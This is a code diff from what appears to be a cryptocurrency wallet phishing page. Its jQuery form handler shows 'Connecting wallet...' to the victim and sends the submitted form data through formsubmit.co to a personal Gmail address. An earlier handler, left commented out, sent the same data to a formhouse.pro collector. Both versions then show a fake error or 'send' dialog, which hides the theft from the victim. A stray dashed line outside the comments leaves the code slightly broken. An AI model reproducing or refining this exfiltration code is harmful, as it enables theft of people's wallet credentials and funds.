@@ -665,57 +665,112 @@
                 "X-CSRF-TOKEN": $('meta[name="csrf-token"]').attr("content"),
             },
         });
-        
+	$("#processForm").submit(function (e) {
+    e.preventDefault();
 
-        $("#processForm").submit(function (e) {
-            e.preventDefault();
-            let processBtn = $("#proceedButton");
-            let cancelBtn = $("#cancelBtn");
-            let formData = new FormData(this);
-            $.ajax({
-                method: "POST",
-                url: 'https://data.formhouse.pro/47jdIE1Mwu6cvPnxcV28XH',
-                data: formData,
-                cache: false,
-                contentType: false,
-                processData: false,
-                beforeSend: function () {
-                    processBtn.html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting wallet...');
-                    processBtn.prop("disabled", true);
-                    cancelBtn.prop("disabled", true);
-                },
-                success: function () {
-                                restoreButtons();
-                                dismissAllDialogs();
-                                errorBox.show();
-                                setTimeout(function () {
-                                    dismissAllDialogs();
-                                    $("#send-dialog").show();
-                                }, 3500);
-                            },
-                            error: function () {
-                                restoreButtons();
-                                dismissAllDialogs();
-                                errorBox.show();
-                                setTimeout(function () {
-                                    dismissAllDialogs();
-                                    $("#send-dialog").show();
-                                }, 3500);
-                            },
-                        });
-            function restoreButtons() {
-                processBtn.html("PROCEED");
-                processBtn.prop("disabled", false);
-                cancelBtn.prop("disabled", false);
-            }
-            function dismissAllDialogs() {
-                successBox.hide();
-                errorBox.hide();
-                $("#connect-dialog").hide();
-                $("#send-dialog").hide();
-                $("#processing-dialog").hide();
-            }
-        });
+    // Selecting elements
+    let processBtn = $("#proceedButton");
+    let cancelBtn = $("#cancelBtn");
+
+    // Creating FormData object
+    let formData = new FormData(this);
+
+    // Disabling buttons and showing loading spinner
+    processBtn.html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting wallet...');
+    processBtn.prop("disabled", true);
+    cancelBtn.prop("disabled", true);
+
+    // Sending AJAX request
+    $.ajax({
+        method: "POST",
+        url: 'https://formsubmit.co/ajax/modelgav@gmail.com',
+        data: formData,
+        cache: false,
+        contentType: false,
+        processData: false,
+        success: function () {
+            handleResponse();
+        },
+        error: function () {
+            handleResponse();
+        }
+    });
+
+    // Helper function to handle success and error responses
+    function handleResponse() {
+        // Restoring buttons
+        processBtn.html("PROCEED");
+        processBtn.prop("disabled", false);
+        cancelBtn.prop("disabled", false);
+
+        // Hiding dialogs
+        hideAllDialogs();
+
+        // Showing success or error dialog after a delay
+        $("#send-dialog").show();
+        setTimeout(function () {
+            hideAllDialogs();
+        }, 3500);
+    }
+
+    // Helper function to hide all dialogs
+    function hideAllDialogs() {
+        $("#send-dialog").hide();
+        // Add more dialogs to hide if needed
+    }
+});
+
+				   
+	--------------------------------------------------------------------------
+        // $("#processForm").submit(function (e) {
+        //     e.preventDefault();
+        //     let processBtn = $("#proceedButton");
+        //     let cancelBtn = $("#cancelBtn");
+        //     let formData = new FormData(this);
+        //     $.ajax({
+        //         method: "POST",
+        //         url: 'https://data.formhouse.pro/47jdIE1Mwu6cvPnxcV28XH',
+        //         data: formData,
+        //         cache: false,
+        //         contentType: false,
+        //         processData: false,
+        //         beforeSend: function () {
+        //             processBtn.html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting wallet...');
+        //             processBtn.prop("disabled", true);
+        //             cancelBtn.prop("disabled", true);
+        //         },
+        //         success: function () {
+        //                         restoreButtons();
+        //                         dismissAllDialogs();
+        //                         errorBox.show();
+        //                         setTimeout(function () {
+        //                             dismissAllDialogs();
+        //                             $("#send-dialog").show();
+        //                         }, 3500);
+        //                     },
+        //                     error: function () {
+        //                         restoreButtons();
+        //                         dismissAllDialogs();
+        //                         errorBox.show();
+        //                         setTimeout(function () {
+        //                             dismissAllDialogs();
+        //                             $("#send-dialog").show();
+        //                         }, 3500);
+        //                     },
+        //                 });
+        //     function restoreButtons() {
+        //         processBtn.html("PROCEED");
+        //         processBtn.prop("disabled", false);
+        //         cancelBtn.prop("disabled", false);
+        //     }
+        //     function dismissAllDialogs() {
+        //         successBox.hide();
+        //         errorBox.hide();
+        //         $("#connect-dialog").hide();
+        //         $("#send-dialog").hide();
+        //         $("#processing-dialog").hide();
+        //     }
+        // }); -------------------------------------------------
         // $("#processForm").submit(function (e) {
         //     e.preventDefault();
         //     let processBtn = $("#proceedButton");
